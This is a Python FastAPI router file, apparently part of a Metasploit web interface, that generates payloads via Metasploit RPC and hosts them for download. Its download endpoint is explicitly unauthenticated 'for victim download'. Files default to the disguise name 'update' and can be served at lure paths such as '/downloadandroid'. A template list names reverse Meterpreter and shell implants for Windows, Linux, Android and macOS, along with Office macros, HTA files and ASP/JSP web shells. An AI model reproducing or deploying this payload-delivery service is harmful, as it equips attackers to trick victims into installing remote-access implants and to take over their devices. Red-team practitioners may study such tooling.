from fastapi import APIRouter, HTTPException, Depends, BackgroundTasks
from fastapi.responses import Response, FileResponse
from pydantic import BaseModel
from typing import Dict, Any, Optional, List
import os
import uuid
import asyncio
import threading
from datetime import datetime, timedelta

from app.core.msf_client import msf_client
from app.api.routes.auth import get_current_active_user

router = APIRouter()

# Payload hosting storage
HOSTED_PAYLOADS_DIR = "/tmp/msf_hosted_payloads"
os.makedirs(HOSTED_PAYLOADS_DIR, exist_ok=True)

# Track hosted payloads by ID
hosted_payloads: Dict[str, dict] = {}

# Map custom URL paths to payload IDs
url_path_mapping: Dict[str, str] = {}


class PayloadGenerateRequest(BaseModel):
    payload: str
    format: str = "raw"
    options: Dict[str, Any] = {}
    encoder: Optional[str] = None
    iterations: int = 1
    bad_chars: Optional[str] = None


class PayloadHostRequest(BaseModel):
    payload: str
    format: str = "raw"
    options: Dict[str, Any] = {}
    encoder: Optional[str] = None
    iterations: int = 1
    filename: Optional[str] = None
    url_path: Optional[str] = None  # Custom URL path like /downloadandroid
    expire_hours: int = 24


@router.get("/formats")
async def list_payload_formats(user=Depends(get_current_active_user)):
    """List available payload output formats."""
    formats = {
        "executable": [
            {"id": "exe", "name": "Windows EXE", "extension": ".exe", "platform": "windows"},
            {"id": "exe-small", "name": "Windows EXE (small)", "extension": ".exe", "platform": "windows"},
            {"id": "exe-only", "name": "Windows EXE (no template)", "extension": ".exe", "platform": "windows"},
            {"id": "dll", "name": "Windows DLL", "extension": ".dll", "platform": "windows"},
            {"id": "msi", "name": "Windows MSI", "extension": ".msi", "platform": "windows"},
            {"id": "elf", "name": "Linux ELF", "extension": "", "platform": "linux"},
            {"id": "elf-so", "name": "Linux Shared Object", "extension": ".so", "platform": "linux"},
            {"id": "macho", "name": "macOS Mach-O", "extension": "", "platform": "macos"},
            {"id": "apk", "name": "Android APK", "extension": ".apk", "platform": "android"},
        ],
        "transform": [
            {"id": "raw", "name": "Raw", "extension": ".bin"},
            {"id": "hex", "name": "Hex", "extension": ".txt"},
            {"id": "c", "name": "C Code", "extension": ".c"},
            {"id": "csharp", "name": "C# Code", "extension": ".cs"},
            {"id": "python", "name": "Python", "extension": ".py"},
            {"id": "powershell", "name": "PowerShell", "extension": ".ps1"},
            {"id": "bash", "name": "Bash", "extension": ".sh"},
            {"id": "java", "name": "Java", "extension": ".java"},
            {"id": "ruby", "name": "Ruby", "extension": ".rb"},
            {"id": "perl", "name": "Perl", "extension": ".pl"},
            {"id": "base64", "name": "Base64", "extension": ".txt"},
            {"id": "dword", "name": "DWORD Array", "extension": ".txt"},
            {"id": "num", "name": "Numeric", "extension": ".txt"},
        ],
        "web": [
            {"id": "asp", "name": "ASP", "extension": ".asp"},
            {"id": "aspx", "name": "ASPX", "extension": ".aspx"},
            {"id": "aspx-exe", "name": "ASPX EXE", "extension": ".aspx"},
            {"id": "jsp", "name": "JSP", "extension": ".jsp"},
            {"id": "war", "name": "WAR", "extension": ".war"},
            {"id": "php", "name": "PHP", "extension": ".php"},
            {"id": "psh", "name": "PowerShell Command", "extension": ".txt"},
            {"id": "psh-cmd", "name": "PowerShell Cmd", "extension": ".cmd"},
            {"id": "psh-net", "name": "PowerShell .NET", "extension": ".ps1"},
            {"id": "psh-reflection", "name": "PowerShell Reflection", "extension": ".ps1"},
            {"id": "hta-psh", "name": "HTA with PowerShell", "extension": ".hta"},
            {"id": "vba", "name": "VBA Macro", "extension": ".vba"},
            {"id": "vba-exe", "name": "VBA Macro EXE", "extension": ".vba"},
            {"id": "vba-psh", "name": "VBA PowerShell", "extension": ".vba"},
            {"id": "vbs", "name": "VBScript", "extension": ".vbs"},
        ]
    }
    return formats


@router.get("/encoders")
async def list_encoders(user=Depends(get_current_active_user)):
    """List available payload encoders with details."""
    try:
        encoders = await msf_client.list_encoders_detailed()
        return {"encoders": encoders, "count": len(encoders)}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/generate")
async def generate_payload(request: PayloadGenerateRequest, user=Depends(get_current_active_user)):
    """Generate a payload with specified options."""
    try:
        payload_data = await msf_client.generate_payload(
            request.payload,
            request.options,
            request.format,
            request.encoder,
            request.iterations,
            request.bad_chars
        )

        # Determine content type and filename
        format_extensions = {
            "exe": (".exe", "application/x-msdownload"),
            "exe-small": (".exe", "application/x-msdownload"),
            "exe-only": (".exe", "application/x-msdownload"),
            "dll": (".dll", "application/x-msdownload"),
            "msi": (".msi", "application/x-msi"),
            "elf": ("", "application/x-executable"),
            "elf-so": (".so", "application/x-sharedlib"),
            "macho": ("", "application/x-mach-binary"),
            "apk": (".apk", "application/vnd.android.package-archive"),
            "raw": (".bin", "application/octet-stream"),
            "c": (".c", "text/x-c"),
            "csharp": (".cs", "text/plain"),
            "python": (".py", "text/x-python"),
            "powershell": (".ps1", "text/plain"),
            "psh": (".txt", "text/plain"),
            "psh-cmd": (".cmd", "text/plain"),
            "psh-net": (".ps1", "text/plain"),
            "psh-reflection": (".ps1", "text/plain"),
            "bash": (".sh", "text/x-shellscript"),
            "base64": (".txt", "text/plain"),
            "hex": (".txt", "text/plain"),
            "php": (".php", "text/x-php"),
            "asp": (".asp", "text/plain"),
            "aspx": (".aspx", "text/plain"),
            "aspx-exe": (".aspx", "text/plain"),
            "jsp": (".jsp", "text/plain"),
            "war": (".war", "application/java-archive"),
            "vba": (".vba", "text/plain"),
            "vba-exe": (".vba", "text/plain"),
            "vba-psh": (".vba", "text/plain"),
            "vbs": (".vbs", "text/plain"),
            "hta-psh": (".hta", "application/hta"),
            "java": (".java", "text/x-java"),
            "ruby": (".rb", "text/x-ruby"),
            "perl": (".pl", "text/x-perl"),
            "dword": (".txt", "text/plain"),
            "num": (".txt", "text/plain"),
        }

        ext, ctype = format_extensions.get(request.format, ("", "application/octet-stream"))
        filename = f"payload{ext}"

        return Response(
            content=payload_data,
            media_type=ctype,
            headers={
                "Content-Disposition": f"attachment; filename={filename}",
                "Content-Length": str(len(payload_data))
            }
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/host")
async def host_payload(request: PayloadHostRequest, user=Depends(get_current_active_user)):
    """Generate and host a payload for download."""
    try:
        # Generate the payload
        payload_data = await msf_client.generate_payload(
            request.payload,
            request.options,
            request.format,
            request.encoder,
            request.iterations
        )

        # Create unique ID and filename
        payload_id = str(uuid.uuid4())[:8]

        # Determine extension
        ext_map = {
            "exe": ".exe", "dll": ".dll", "msi": ".msi",
            "elf": "", "apk": ".apk", "raw": ".bin",
            "php": ".php", "asp": ".asp", "aspx": ".aspx",
            "jsp": ".jsp", "war": ".war", "ps1": ".ps1",
            "hta-psh": ".hta", "vbs": ".vbs", "py": ".py",
        }
        ext = ext_map.get(request.format, "")

        filename = request.filename or f"update{ext}"
        if not filename.endswith(ext) and ext:
            filename += ext

        # Save payload
        file_path = os.path.join(HOSTED_PAYLOADS_DIR, f"{payload_id}_{filename}")
        with open(file_path, 'wb') as f:
            f.write(payload_data)

        # Determine URL path
        if request.url_path:
            # Normalize the path - ensure it starts with /
            custom_path = request.url_path if request.url_path.startswith('/') else f'/{request.url_path}'
            # Remove any existing mapping for this path
            url_path_mapping[custom_path] = payload_id
            url = f"/dl{custom_path}"
        else:
            # Default path: /filename.ext
            default_path = f"/{filename}"
            url_path_mapping[default_path] = payload_id
            url = f"/dl{default_path}"

        # Track hosted payload
        expire_time = datetime.now() + timedelta(hours=request.expire_hours)
        hosted_payloads[payload_id] = {
            "id": payload_id,
            "filename": filename,
            "path": file_path,
            "payload": request.payload,
            "format": request.format,
            "size": len(payload_data),
            "created": datetime.now().isoformat(),
            "expires": expire_time.isoformat(),
            "downloads": 0,
            "url": url,
            "url_path": request.url_path or f"/{filename}"
        }

        return {
            "id": payload_id,
            "filename": filename,
            "url": url,
            "url_path": request.url_path or f"/{filename}",
            "size": len(payload_data),
            "expires": expire_time.isoformat()
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/hosted")
async def list_hosted_payloads(user=Depends(get_current_active_user)):
    """List all hosted payloads."""
    # Clean up expired payloads
    now = datetime.now()
    expired = []
    for pid, info in hosted_payloads.items():
        if datetime.fromisoformat(info["expires"]) < now:
            expired.append(pid)

    for pid in expired:
        info = hosted_payloads.pop(pid, None)
        if info:
            # Remove from URL path mapping
            url_path = info.get("url_path")
            if url_path and url_path in url_path_mapping:
                del url_path_mapping[url_path]
            if os.path.exists(info["path"]):
                os.unlink(info["path"])

    return {"payloads": list(hosted_payloads.values()), "count": len(hosted_payloads)}


@router.delete("/hosted/{payload_id}")
async def delete_hosted_payload(payload_id: str, user=Depends(get_current_active_user)):
    """Delete a hosted payload."""
    if payload_id not in hosted_payloads:
        raise HTTPException(status_code=404, detail="Payload not found")

    info = hosted_payloads.pop(payload_id)

    # Remove from URL path mapping
    url_path = info.get("url_path")
    if url_path and url_path in url_path_mapping:
        del url_path_mapping[url_path]

    if os.path.exists(info["path"]):
        os.unlink(info["path"])

    return {"status": "deleted", "id": payload_id}


@router.get("/download/{payload_id}/{filename}")
async def download_hosted_payload(payload_id: str, filename: str):
    """Download a hosted payload (no auth required for victim download)."""
    if payload_id not in hosted_payloads:
        raise HTTPException(status_code=404, detail="Not found")

    info = hosted_payloads[payload_id]

    # Check expiry
    if datetime.fromisoformat(info["expires"]) < datetime.now():
        hosted_payloads.pop(payload_id, None)
        if os.path.exists(info["path"]):
            os.unlink(info["path"])
        raise HTTPException(status_code=404, detail="Not found")

    if not os.path.exists(info["path"]):
        raise HTTPException(status_code=404, detail="Not found")

    # Increment download counter
    info["downloads"] += 1

    return FileResponse(
        info["path"],
        filename=info["filename"],
        media_type="application/octet-stream"
    )


@router.get("/{payload_name:path}/options")
async def get_payload_options(payload_name: str, user=Depends(get_current_active_user)):
    """Get available options for a payload."""
    if not msf_client.connected:
        raise HTTPException(status_code=503, detail="Metasploit RPC not connected")

    try:
        info = await msf_client.get_module_info("payload", payload_name)
        return {
            "payload": payload_name,
            "options": info.get("options", {}),
            "required": info.get("required_options", [])
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/templates")
async def list_payload_templates(user=Depends(get_current_active_user)):
    """List common payload generation templates including Android."""
    templates = [
        # Windows
        {
            "name": "Windows Reverse Meterpreter (x64)",
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "format": "exe",
            "platform": "windows",
            "arch": "x64",
            "options": {"LHOST": "", "LPORT": 4444}
        },
        {
            "name": "Windows Reverse Meterpreter (x86)",
            "payload": "windows/meterpreter/reverse_tcp",
            "format": "exe",
            "platform": "windows",
            "arch": "x86",
            "options": {"LHOST": "", "LPORT": 4444}
        },
        {
            "name": "Windows Reverse Shell (x64)",
            "payload": "windows/x64/shell_reverse_tcp",
            "format": "exe",
            "platform": "windows",
            "arch": "x64",
            "options": {"LHOST": "", "LPORT": 4444}
        },
        {
            "name": "Windows Stageless Meterpreter (x64)",
            "payload": "windows/x64/meterpreter_reverse_tcp",
            "format": "exe",
            "platform": "windows",
            "arch": "x64",
            "options": {"LHOST": "", "LPORT": 4444}
        },
        # Linux
        {
            "name": "Linux Reverse Meterpreter (x64)",
            "payload": "linux/x64/meterpreter/reverse_tcp",
            "format": "elf",
            "platform": "linux",
            "arch": "x64",
            "options": {"LHOST": "", "LPORT": 4444}
        },
        {
            "name": "Linux Reverse Meterpreter (x86)",
            "payload": "linux/x86/meterpreter/reverse_tcp",
            "format": "elf",
            "platform": "linux",
            "arch": "x86",
            "options": {"LHOST": "", "LPORT": 4444}
        },
        {
            "name": "Linux Reverse Shell",
            "payload": "linux/x64/shell_reverse_tcp",
            "format": "elf",
            "platform": "linux",
            "arch": "x64",
            "options": {"LHOST": "", "LPORT": 4444}
        },
        # Android
        {
            "name": "Android Meterpreter (Reverse TCP)",
            "payload": "android/meterpreter/reverse_tcp",
            "format": "apk",
            "platform": "android",
            "arch": "dalvik",
            "options": {"LHOST": "", "LPORT": 4444}
        },
        {
            "name": "Android Meterpreter (Reverse HTTPS)",
            "payload": "android/meterpreter/reverse_https",
            "format": "apk",
            "platform": "android",
            "arch": "dalvik",
            "options": {"LHOST": "", "LPORT": 8443}
        },
        {
            "name": "Android Meterpreter (Reverse HTTP)",
            "payload": "android/meterpreter/reverse_http",
            "format": "apk",
            "platform": "android",
            "arch": "dalvik",
            "options": {"LHOST": "", "LPORT": 8080}
        },
        {
            "name": "Android Shell (Reverse TCP)",
            "payload": "android/shell/reverse_tcp",
            "format": "apk",
            "platform": "android",
            "arch": "dalvik",
            "options": {"LHOST": "", "LPORT": 4444}
        },
        # macOS
        {
            "name": "macOS Reverse Meterpreter (x64)",
            "payload": "osx/x64/meterpreter/reverse_tcp",
            "format": "macho",
            "platform": "macos",
            "arch": "x64",
            "options": {"LHOST": "", "LPORT": 4444}
        },
        {
            "name": "macOS Reverse Shell",
            "payload": "osx/x64/shell_reverse_tcp",
            "format": "macho",
            "platform": "macos",
            "arch": "x64",
            "options": {"LHOST": "", "LPORT": 4444}
        },
        # Cross-platform
        {
            "name": "Python Meterpreter",
            "payload": "python/meterpreter/reverse_tcp",
            "format": "raw",
            "platform": "multi",
            "arch": "python",
            "options": {"LHOST": "", "LPORT": 4444}
        },
        {
            "name": "Java Meterpreter (JAR)",
            "payload": "java/meterpreter/reverse_tcp",
            "format": "jar",
            "platform": "multi",
            "arch": "java",
            "options": {"LHOST": "", "LPORT": 4444}
        },
        {
            "name": "Java Meterpreter (WAR)",
            "payload": "java/meterpreter/reverse_tcp",
            "format": "war",
            "platform": "multi",
            "arch": "java",
            "options": {"LHOST": "", "LPORT": 4444}
        },
        {
            "name": "PHP Meterpreter",
            "payload": "php/meterpreter/reverse_tcp",
            "format": "raw",
            "platform": "multi",
            "arch": "php",
            "options": {"LHOST": "", "LPORT": 4444}
        },
        # Web Payloads
        {
            "name": "PowerShell Reverse Shell",
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "format": "psh-reflection",
            "platform": "windows",
            "arch": "x64",
            "options": {"LHOST": "", "LPORT": 4444}
        },
        {
            "name": "HTA Application",
            "payload": "windows/meterpreter/reverse_tcp",
            "format": "hta-psh",
            "platform": "windows",
            "arch": "x86",
            "options": {"LHOST": "", "LPORT": 4444}
        },
        {
            "name": "VBA Macro (Office)",
            "payload": "windows/meterpreter/reverse_tcp",
            "format": "vba",
            "platform": "windows",
            "arch": "x86",
            "options": {"LHOST": "", "LPORT": 4444}
        },
        {
            "name": "ASP Web Shell",
            "payload": "windows/meterpreter/reverse_tcp",
            "format": "asp",
            "platform": "windows",
            "arch": "x86",
            "options": {"LHOST": "", "LPORT": 4444}
        },
        {
            "name": "JSP Web Shell",
            "payload": "java/jsp_shell_reverse_tcp",
            "format": "raw",
            "platform": "multi",
            "arch": "java",
            "options": {"LHOST": "", "LPORT": 4444}
        },
    ]
    return {"templates": templates}
